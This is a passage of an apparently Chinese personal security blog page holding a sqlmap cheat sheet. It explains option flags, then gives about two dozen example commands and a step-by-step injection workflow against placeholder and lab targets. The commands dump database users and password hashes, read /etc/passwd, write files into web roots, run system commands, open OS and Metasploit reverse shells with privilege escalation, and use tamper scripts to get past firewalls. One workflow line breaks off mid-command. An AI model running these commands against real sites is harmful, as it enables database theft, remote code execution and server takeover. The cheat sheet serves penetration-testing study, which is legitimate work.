+--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)<br>
+--os      #指定系统(Linux,Windows)<br>
+-v  #详细的等级(0-6)<br>
+0：只显示Python的回溯，错误和关键消息。<br>
+1：显示信息和警告消息。<br>
+2：显示调试消息。<br>
+3：有效载荷注入。<br>
+4：显示HTTP请求。<br>
+5：显示HTTP响应头。<br>
+6：显示HTTP响应页面的内容<br>
+--privileges  #查看权限<br>
+--is-dba      #是否是数据库管理员<br>
+--roles       #枚举数据库用户角色<br>
+--udf-inject  #导入用户自定义函数（获取系统权限）<br>
+--union-check  #是否支持union 注入<br>
+--union-cols #union 查询表记录<br>
+--union-test #union 语句测试<br>
+--union-use  #采用union 注入<br>
+--union-tech orderby #union配合order by<br>
+--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;)<br>
+--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”)<br>
+--referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;)<br>
+--user-agent &quot;&quot;  #自定义user-agent<br>
+--proxy &quot;http://127.0.0.1:8118&quot; #代理注入<br>
+--string=&quot;&quot;    #指定关键词,字符串匹配.<br>
+--threads 　　  #采用多线程(--threads 3)<br>
+--sql-shell    #执行指定sql命令<br>
+--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1&quot; )<br>
+--file-read    #读取指定文件<br>
+--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)<br>
+--file-dest    #要写入的文件绝对路径<br>
+--os-cmd=id    #执行系统命令<br>
+--os-shell     #系统交互shell<br>
+--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/)<br>
+--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/)<br>
+--os-smbrelay  #<br>
+--os-bof       #<br>
+--reg-read     #读取win系统注册表<br>
+--priv-esc     #<br>
+--time-sec=    #延迟设置 默认--time-sec=5 为5秒<br>
+-p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入<br>
+--eta          #盲注<br>
+/pentest/database/sqlmap/txt/<br>
+common-columns.txt　　字段字典　　　<br>
+common-outputs.txt<br>
+common-tables.txt      表字典<br>
+keywords.txt<br>
+oracle-default-passwords.txt<br>
+user-agents.txt<br>
+wordlist.txt</p>
+<pre><code>常用语句 :
+1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 
+2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 
+3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 
+4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs 
+5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 
+6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 
+7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 
+8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 
+9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 
+10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 
+11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 
+12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 
+13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 
+14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 
+15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;')&quot; --suffix &quot;AND ('abc'='abc&quot;
+16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;
+17./sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;
+18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 
+19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT 'foo'&quot; -v 1 
+20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner 
+21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string='xx' --dbs --level=3 -p &quot;uid&quot;
+
+简单的注入流程 :
+1.读取数据库版本，当前用户，当前数据库 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
+2.判断当前数据库用户权限 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
+3.读取所有数据库用户或指定数据库用户的密码 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
+4.获取所有数据库 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
+5.获取指定数据库中的所有表 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
+6.获取指定数据库名中指定表的字段 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
+7.获取指定数据库名中指定表中指定字段的数据 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 
+8.file-read读取web文件 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 
+9.file-write写入文件到web 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：
+
+涉及资源
+https://www.cnblogs.com/bmjoker/p/9326258.html
+
+http://github.com/youngyangyang04/NoSQLAttack
+
+https://github.com/sqlmapproject/sqlmap/zipball/master
+
+https://blog.csdn.net/qq_39936434/category_9103379.html</code></pre>
+
+            </div>
+          </article>
+        </div>
+        <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="https://jinqipiaopiao.github.io/post/shu-jia-xue-xi-bi-ji-ji-lu/">
+                <h3 class="post-title">
+                  暑假学习笔记记录
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+        
+      </div>
+
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="https://jinqipiaopiao.github.io//images/avatar.png?v=1633486821567" class="no-responsive avatar">
+    <div class="text-muted">温故而知新</div>
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/2021-9-4-kai-xue-bi-ji/">2021-9-4开学笔记</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/shu-jia-xue-xi-bi-ji-ji-lu/">暑假学习笔记记录</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/">SQL注入过滤字符的Fuzz脚本测试</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/md5-xiang-guan-bi-jiao/">md5相关比较</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/buuctf/">BUUCTF</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/li-yong-yu-bian-yi-lai-sql-zhu-ru/">利用预编译来SQL注入</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/python-mo-ban-zhu-ru/">Python-模板注入</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/web-an-quan-xiang-guan-zhi-shi-dian/">web安全相关知识点</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/userini-wen-jian-gou-cheng-de-php-hou-men/">.user.ini文件构成的PHP后门</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/ying-yong-ceng-xie-yi/">应用层协议</a>
+            </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="https://jinqipiaopiao.github.io/tag/I-a6dyp2Q/" class="badge ">
+          Gridea
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jinqipiaopiao.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+
+  </body>
+</html>
